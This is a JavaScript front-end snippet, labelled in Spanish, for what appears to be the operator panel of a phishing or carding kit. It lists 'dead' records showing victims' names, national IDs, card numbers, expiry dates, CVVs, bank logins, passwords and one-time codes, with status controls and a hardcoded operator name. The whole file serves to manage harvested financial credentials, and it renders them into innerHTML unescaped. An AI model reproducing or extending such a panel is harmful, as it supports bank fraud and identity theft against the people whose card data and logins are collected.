const deadButton = document.getElementById('dead-button');

deadButton.addEventListener('click', (link) => {
  link.preventDefault();

  titleContent.innerHTML = "Unidades Muertas";
  divDataTables.innerHTML = "";

  data.forEach((object) => {

    if (object.estadot == "dead") {
      const panel = document.createElement("div");
      panel.className = "card mb-3";

      let options = {
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      };

      date = new Date(object.horacreado).toLocaleDateString("es-ES", options);
      setDate = new Date(object.horamodificado).toLocaleDateString(
        "es-ES",
        options
      );

      panel.innerHTML = `<div class="justify-content-center align-items-center mx-auto">
                <div class="dropdown mt-3 mb-2 mx-3">
                    <button class="btn btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                        Acciones
                    </button>
                    <ul class="dropdown-menu" data-id="${object.idreg}">
                      <li><a class="dropdown-item" href="" data-estado="pendiente" onclick="putStatus(this.closest('.dropdown-menu').getAttribute('data-id'), this.getAttribute('data-estado')); location.reload();">Pendiente</a></li>
                      <li><a class="dropdown-item" href="" data-estado="finalizado" onclick="putStatus(this.closest('.dropdown-menu').getAttribute('data-id'), this.getAttribute('data-estado')); location.reload();">Finalizado</a></li>
                      <li><a class="dropdown-item" href="" data-estado="dead" onclick="putStatus(this.closest('.dropdown-menu').getAttribute('data-id'), this.getAttribute('data-estado')); location.reload();">Muerta</a></li>
                    </ul>
                </div>
                <table class="table table-bordered mt-2">
                <thead class="table-primary">
                    <tr>
                    <th>Nombre</th>
                    <th>Cédula</th>
                    <th>Direccion</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td>${object.nombre}</td>
                    <td>${object.id}</td>
                    <td>${object.direccion}</td>
                    </tr>
                </tbody>
                <thead class="table-primary">
                    <tr>
                    <th>Tarjeta</th>
                    <th>FTarjeta</th>
                    <th>CVV</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td>${object.tarjeta}</td>
                    <td>${object.ftarjeta}</td>
                    <td>${object.cvv}</td>
                    </tr>
                </tbody>
                <thead class="table-primary">
                    <tr>
                    <th>Email</th>
                    <th>Celular</th>
                    <th>Banco</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td>${object.email}</td>
                    <td>${object.celular}</td>
                    <td>${object.banco}</td>
                    </tr>
                </tbody>
                <thead class="table-primary">
                    <tr>
                    <th>Estado</th>
                    <th>Dispositivo</th>
                    <th>IP</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td>${object.status}</td>
                    <td>${object.dispositivo}</td>
                    <td>${object.ip}</td>
                    </tr>
                </tbody>
                <thead class="table-primary">
                    <tr>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                    <th>OTP</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td>${object.usuario}</td>
                    <td>${object.password}</td>
                    <td>${object.otp}</td>
                    </tr>
                </tbody>
                <thead class="table-primary">
                    <tr>
                    <th>Hora Creado</th>
                    <th>Hora Modificado</th>
                    <th>By</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td>${date}</td>
                    <td>${setDate}</td>
                    <td> Gohan </td>
                    </tr>
                </tbody>
                </table>
                </div>
                
            `;

      divDataTables.appendChild(panel);
    }

  })

});